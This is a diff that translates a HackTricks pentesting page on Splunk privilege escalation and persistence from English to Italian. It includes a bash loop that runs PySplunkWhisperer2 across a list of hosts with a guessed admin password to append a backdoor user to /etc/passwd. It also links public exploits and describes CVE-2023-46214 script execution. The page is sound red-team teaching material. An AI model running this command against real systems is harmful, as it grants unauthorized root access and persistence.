@@ -1,77 +1,76 @@
-# Splunk LPE and Persistence
+# Splunk LPE e Persistenza
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-If **enumerating** a machine **internally** or **externally** you find **Splunk running** (port 8090), if you luckily know any **valid credentials** you can **abuse the Splunk service** to **execute a shell** as the user running Splunk. If root is running it, you can escalate privileges to root.
+Se **enumerando** una macchina **internamente** o **esternamente** trovi **Splunk in esecuzione** (porta 8090), se per fortuna conosci delle **credenziali valide** puoi **abusare del servizio Splunk** per **eseguire una shell** come l'utente che esegue Splunk. Se è in esecuzione come root, puoi ottenere privilegi di root.
 
-Also if you are **already root and the Splunk service is not listening only on localhost**, you can **steal** the **password** file **from** the Splunk service and **crack** the passwords, or **add new** credentials to it. And maintain persistence on the host.
+Inoltre, se sei **già root e il servizio Splunk non è in ascolto solo su localhost**, puoi **rubare** il **file delle password** dal servizio Splunk e **craccare** le password o **aggiungere nuove** credenziali ad esso. E mantenere la persistenza sull'host.
 
-In the first image below you can see how a Splunkd web page looks like.
+Nella prima immagine qui sotto puoi vedere come appare una pagina web di Splunkd.
 
 
 
-## Splunk Universal Forwarder Agent Exploit Summary
+## Sommario dell'exploit dell'Agente Splunk Universal Forwarder
 
-For further details check the post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). This is just a sumary:
+Per ulteriori dettagli consulta il post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Questo è solo un sommario:
 
-**Exploit Overview:**
-An exploit targeting the Splunk Universal Forwarder Agent (UF) allows attackers with the agent password to execute arbitrary code on systems running the agent, potentially compromising an entire network.
+**Panoramica dell'exploit:**
+Un exploit mirato all'Agente Splunk Universal Forwarder (UF) consente agli attaccanti con la password dell'agente di eseguire codice arbitrario sui sistemi in cui è in esecuzione l'agente, compromettendo potenzialmente un'intera rete.
 
-**Key Points:**
-- The UF agent does not validate incoming connections or the authenticity of code, making it vulnerable to unauthorized code execution.
-- Common password acquisition methods include locating them in network directories, file shares, or internal documentation.
-- Successful exploitation can lead to SYSTEM or root level access on compromised hosts, data exfiltration, and further network infiltration.
+**Punti chiave:**
+- L'agente UF non convalida le connessioni in ingresso o l'autenticità del codice, rendendolo vulnerabile all'esecuzione di codice non autorizzato.
+- I metodi comuni di acquisizione delle password includono la loro individuazione nelle directory di rete, nelle condivisioni di file o nella documentazione interna.
+- L'exploit riuscito può portare all'accesso a livello di SYSTEM o root sugli host compromessi, all'esfiltrazione dei dati e all'infiltrazione ulteriore nella rete.
 
-**Exploit Execution:**
-1. Attacker obtains the UF agent password.
-2. Utilizes the Splunk API to send commands or scripts to the agents.
-3. Possible actions include file extraction, user account manipulation, and system compromise.
+**Esecuzione dell'exploit:**
+1. L'attaccante ottiene la password dell'agente UF.
+2. Utilizza l'API di Splunk per inviare comandi o script agli agenti.
+3. Le azioni possibili includono l'estrazione di file, la manipolazione degli account utente e la compromissione del sistema.
 
-**Impact:**
-- Full network compromise with SYSTEM/root level permissions on each host.
-- Potential for disabling logging to evade detection.
-- Installation of backdoors or ransomware.
+**Impatto:**
+- Compromissione completa della rete con autorizzazioni a livello di SYSTEM/root su ogni host.
+- Possibilità di disabilitare la registrazione per eludere la rilevazione.
+- Installazione di backdoor o ransomware.
 
-**Example Command for Exploitation:**
+**Esempio di comando per l'exploit:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-
-**Usable public exploits:**
+**Exploit pubblici utilizzabili:**
 * https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
 * https://www.exploit-db.com/exploits/46238
 * https://www.exploit-db.com/exploits/46487
 
 
-## Abusing Splunk Queries
+## Abuso delle query di Splunk
 
-**For further details check the post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
+**Per ulteriori dettagli, consulta il post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
 
-The **CVE-2023-46214** allowed to upload an arbitrary script to **`$SPLUNK_HOME/bin/scripts`** and then explained that using the search query **`|runshellscript script_name.sh`** it was possible to **execute** the **script** stored in there.
+Il **CVE-2023-46214** consentiva di caricare uno script arbitrario in **`$SPLUNK_HOME/bin/scripts`** e poi spiegava che utilizzando la query di ricerca **`|runshellscript script_name.sh`** era possibile **eseguire** lo **script** memorizzato lì.
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
